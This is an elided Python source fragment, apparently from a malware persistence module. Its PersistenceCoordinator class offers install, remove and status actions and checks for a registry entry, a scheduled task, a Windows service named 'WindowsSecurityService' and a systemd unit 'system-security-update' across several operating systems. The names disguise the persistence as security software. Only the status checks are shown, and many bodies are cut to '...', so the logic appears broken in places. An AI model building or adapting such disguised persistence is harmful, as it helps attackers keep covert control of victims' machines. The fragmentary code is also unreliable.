...
class PersistenceCoordinator:
    ...
    def check_persistence_status(self) -> None:
        ...
        if self.os_type == "windows":
            ...
            print(" Unknown OS; cannot check persistence status")

    def _check_windows_persistence(self) -> None:
        ...
        try:
            ...
            checks.append(" Registry persistence: Error opening key")
        ...
        try:
            ...
            checks.append(" Scheduled task: Error checking")

        # Check service
        try:
            result = subprocess.run(["sc", "query", "WindowsSecurityService"], capture_output=True, text=True)
            if result.returncode == 0:
                checks.append(" Windows service: Active")
            else:
                checks.append(" Windows service: Not found")
        except Exception:
            checks.append(" Windows service: Error checking")

        for check in checks:
            print(check)

    def _check_macos_persistence(self) -> None:
    ...
    def _check_linux_persistence(self) -> None:
        ...
        try:
            result = subprocess.run(
                ["systemctl", "is-enabled", "system-security-update"],
                capture_output=True,
                text=True,
            )
        ...
        try:
            ...
            if "system_security_wrapper" in (result.stdout or ""):
    ...
    def _check_android_persistence(self) -> None:
...
if __name__ == "__main__":
    ...
    parser.add_argument("action", choices=["install", "remove", "status"], help="Action to perform")
